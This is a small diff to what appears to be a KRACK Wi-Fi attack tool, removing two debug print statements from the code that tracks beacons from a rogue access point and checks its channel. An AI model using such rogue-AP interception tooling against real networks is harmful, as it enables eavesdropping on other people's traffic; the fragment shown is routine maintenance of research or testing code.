@@ -744,8 +744,6 @@ class KRAckAttack():
 
 		# 1. Handle frames sent BY the rouge AP
 		if p.addr2 == self.apmac:
-			print(p.addr1, p.addr2, end='  channel: ')
-			print(ord(get_tlv_value(p, IEEE_TLV_TYPE_CHANNEL)))
 			# Track time of last beacon we received. Verify channel to assure it's not the real AP.
 			if p.haslayer(Dot11Beacon) and ord(get_tlv_value(p, IEEE_TLV_TYPE_CHANNEL)) == self.netconfig.rogue_channel:
 				self.last_rogue_beacon = time.time()
